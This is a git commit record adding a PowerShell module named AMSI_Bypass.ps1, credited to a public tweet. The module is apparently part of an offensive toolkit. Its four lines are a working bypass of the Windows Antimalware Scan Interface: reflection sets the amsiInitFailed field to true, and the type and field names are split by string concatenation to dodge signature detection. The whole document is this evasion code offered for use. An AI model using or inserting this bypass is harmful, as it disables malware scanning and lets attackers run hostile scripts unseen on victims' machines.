f371160706a6016a12724029849c24c973563cb9
darkz3ro <darkz3ro@localhost.localdomain>
2020-08-18 19:52:39 +0300

    recommended AMSI bypass

---
+++ Modules/AMSI_Bypass.ps1
@@ -0,0 +1,4 @@
+# ALL CREDIT TO @MATTEFESTATION FOR THE INITIAL TWEET
+
+$Ref=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils');
+$Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true);
